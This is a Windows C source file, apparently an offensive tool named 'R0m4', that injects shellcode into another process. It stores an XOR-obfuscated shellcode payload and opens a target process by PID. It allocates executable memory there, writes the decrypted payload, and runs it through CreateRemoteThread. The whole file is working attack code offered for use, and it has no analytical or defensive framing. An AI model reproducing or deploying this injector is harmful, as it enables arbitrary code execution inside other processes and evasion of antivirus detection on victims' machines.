#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)



//Here we used xor enc on the payload

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
unsigned char R0m4InShell[] =
"\x56\xe3\x2f\x49\x5e\x47\x7c\xb1\xb2\xb3\xf5\xe4\xf7\xe7\xea\xe8\xec\xf3"
"\x8d\x6f\xdb\xf7\x4b\x93\xa2\x8b\x4f\x97\xde\x8f\x43\x9b\xea\x86\xfd\x04"
"\x86\xc0\x67\x9b\x98\x9b\x5f\xa7\x86\x9f\xe9\x19\x76\xe7\xbd\xa1\xdc\xf3"
"\xc0\xa0\x23\x2a\xe9\xa4\xe7\x26\x0a\x04\xb8\xaa\xbd\xa5\x65\xbd\xd0\x7a"
"\xb0\xcf\xbc\xf4\x26\x91\x79\x81\xe2\xf0\xfe\xf2\x7b\x8d\x00\x01\x02\x88"
"\x84\x8d\x06\x07\x08\x41\x8f\xcb\x78\x6a\x46\x0e\xc0\x41\x99\x5b\x0c\x51"
"\x9d\x57\x38\x50\x1b\xcb\xff\x4b\x53\x2e\xe9\x69\xdd\xea\x65\xae\x12\xaf"
"\x60\x28\xfc\x63\x1d\xed\x6f\xee\xf9\x3c\x9e\x72\x35\xf4\x0e\xd7\x4d\xc8"
"\x76\x38\x70\x19\x36\x7a\x79\x90\x37\x9b\x1c\x01\xcd\x07\x6c\x00\x4b\x9b"
"\x2a\x0c\xc5\x43\x18\x15\xd9\x13\x48\x1c\x57\x87\x19\xd2\x5e\xd3\x14\x5c"
"\x8e\x1e\x38\x20\x3a\x3d\x3d\x3f\x27\x3f\x29\x30\x2b\x31\x24\xee\x82\x4f"
"\x31\x23\x8d\x93\x2c\x34\x2f\x2d\x30\xf2\x68\x92\x37\x82\x81\x80\xdd\xc8"
"\x3c\xf4\xf7\xb7\xd9\xb4\xba\x89\x8a\xca\xda\xc4\x07\x69\xd8\x10\x7e\x33"
"\x95\x95\x96\xde\x11\x7c\xd3\x27\x9e\x9d\x8f\xc3\x0c\xbb\x15\xe1\xe5\xf1"
"\xef\x2e\x4c\xe5\x23\x5a\xed\x17\xe2\xd8\x96\xb6\x4d\x66\xf8\x3c\x5c\xdf"
"\xb9\xb8\xba\xbb\xe5\xfc\x04\x96\x40\xaa\xc2\x3c\x11\xaf\xcc\x86\x96\x99"
"\x9a\x86\xfd\x04\x83\xfe\x10\x99\x2d\x13\x9c\x5c\x14\x9f\x27\x19\x92\x52"
"\x1d\x9c\x64\x35\xef\x3e\x02\x1c\x31\xad\x6f\x20\x82\xf9\xab\xb3\xa0\x64"
"\x0c\xa7\x79\x08\xb3\x49\x6d\x50\x82\x96\x07\x2c\x7f\x3b\x88\xf7\xb7\x00"
"\xce\x74\xe7\xeb\x97\x05\x06\x07\x40\x8a\xe6\x1b\x44\x84\xec\x42\x21\xd8"
"\x78\x17\x55\x4d\x5e\x9e\xe1\x58\xa0\x19\xc5\xd5\x41\xe0\xf5\xa2\xda\x23"
"\x5a\x70\x6e\xa4\xec\x09\x74\xa2\xda\x47\x6e\x6e\x69\x59\x32\x23\x34\x35"
"\x77\x6f\x70\xb0\xc8\x73\x0d\xf4\x7f\x85\x18\xe5\x11\xa6\xbb\x90\x0e\xce"
"\x8b\x00\xc3\x8c\x01\x7c\x87\x06\xd9\xa1\x1a\xda\x8e\x1d\xdf\xae\x19\xe3"
"\x58\x82\x94\x02\xa1\x8a\xe3\x99\x62\x1e\x4c\x3d\x27\x30\x31\x01\x6a\x2b"
"\x6c\x6d\x2f\x37\x1a\x71\x28\x32\xce\x7e\x59\x78\x48\x86\xaf\x2c\x25\x3c"
"\xc4\x0a\xee\xcc\xe3\x7c\x51\xcc\x79\x49\x61\xb5\x75\x74\x73\xc5\x8f\x4c"
"\xd8\xb8\x54\xdb\x11\x63\xe3\x23\xd9\x66\x7d\xc3\xf6\x9d\xc7\x24\x40\xbc"
"\x88\xa9\xe5\x2c\x7c\x58\x7d\xa9\x45";
#define XOR_KEY 0xAA

// Function to decrypt the shellcode
unsigned char* xorEncryptDecrypt(const unsigned char* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
    unsigned char* decryptedShellcode = (unsigned char*)malloc(sShellcodeSize);
    if (decryptedShellcode == NULL) {
        perror("Failed to allocate memory for decrypted shellcode");
        exit(EXIT_FAILURE);
    }

    for (size_t i = 0; i < sShellcodeSize; i++) {
        decryptedShellcode[i] = pShellcode[i] ^ (bKey + i);
        printf("\\x%02x", decryptedShellcode[i]);
    }
    return decryptedShellcode;
}

void decryptShellcode() {
    unsigned char* decryptedShellcode = xorEncryptDecrypt(R0m4InShell, sizeof(R0m4InShell), XOR_KEY);
    free(decryptedShellcode); // Clean up memory when done
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warning("you should enter the process ID to inject the SHELLCODE in !! \n USAGE : R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    info("Now we are trying to open the process with the ID : %ld \n", PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess != NULL) {
        okay("We got handle on the process----------0x%p", hProcess);

        // Allocate some bytes to the process memory
        rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions inside %ld", sizeof(R0m4InShell), PID);

        // Decrypt the shellcode
        unsigned char* decryptedShellcode = xorEncryptDecrypt(R0m4InShell, sizeof(R0m4InShell), XOR_KEY);
        // Write the decrypted shellcode into the process memory

        WriteProcessMemory(hProcess, rBuffer, decryptedShellcode, sizeof(R0m4InShell), NULL);
        info("Wrote %zu-bytes to process memory\n", sizeof(R0m4InShell));

        // Clean up
        free(decryptedShellcode);

        // Create remote thread to execute shellcode
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
        if (hThread != NULL) {
            info("Created remote thread in the process %ld with the TID %ld", PID, TID);
        }
        else {
            warning("Failed to create remote thread: %ld", GetLastError());
        }

        // Close handles
        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
    else {
        warning("Failed to open process: %ld", GetLastError());
    }

    return EXIT_SUCCESS;
}


